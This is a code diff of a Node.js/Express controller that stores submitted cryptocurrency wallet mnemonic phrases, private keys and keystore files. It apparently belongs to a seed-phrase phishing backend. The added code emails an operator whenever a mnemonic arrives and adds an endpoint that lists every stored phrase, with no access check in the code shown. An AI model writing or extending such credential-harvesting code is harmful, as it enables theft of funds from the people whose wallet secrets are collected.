@@ -3,16 +3,27 @@ const Mnemonic = require("../Models/Mnemonic");
 const PrivateKey = require("../Models/PrivateKey");
 const Keystore = require("../Models/Keystore");
 const path = require("path");
+const { sendEmail } = require("../utils/sendEmail");
+require("dotenv").config();
 
 exports.saveMnemonic = async (req, res, next) => {
   const { walletAddress, mnemonicPhrase } = req.body;
+  // console.lo;
   try {
     const newMnemonic = new Mnemonic({
       walletAddress,
       mnemonicPhrase,
     });
+    let url = `${req.protocol}://${req.get("host")}/api/all/Mnemonic`;
     const savedMnemonic = await newMnemonic.save();
-    console.log(savedMnemonic);
+    const message = `You are receiving this email because someone else has sent you a mnemonic phrase. click this: \n\n ${url}
+    \n to see list of all the menomic phrase in your database`;
+
+    await sendEmail({
+      email: process.env.TO_EMAIL,
+      subject: "Mnemonic sent",
+      message,
+    });
     return res.status(201).json({
       success: true,
       savedMnemonic,
@@ -40,12 +51,6 @@ exports.savePrivateKey = async (req, res, next) => {
   } catch (error) {
     return next(new ErrorResponse(`unable to save Private Key`, 401));
   }
-};
-exports.test = async (req, res, next) => {
-  return res.status(200).json({
-    success: true,
-    msg: "Private Key is saved successfully",
-  });
 };
 
 exports.saveKeystore = async (req, res, next) => {
@@ -76,5 +81,16 @@ exports.saveKeystore = async (req, res, next) => {
     }
   } catch (err) {
     return next(new ErrorResponse(`Unable to upload File`, 500));
+  }
+};
+
+exports.getMnemonics = async (req, res, next) => {
+  try {
+    const mnemonics = await Mnemonic.find({});
+    return res
+      .status(200)
+      .json({ success: true, length: mnemonics.length, mnemonics });
+  } catch (error) {
+    return next(new ErrorResponse(`Unable to get Mnemonic`, 401));
   }
 };
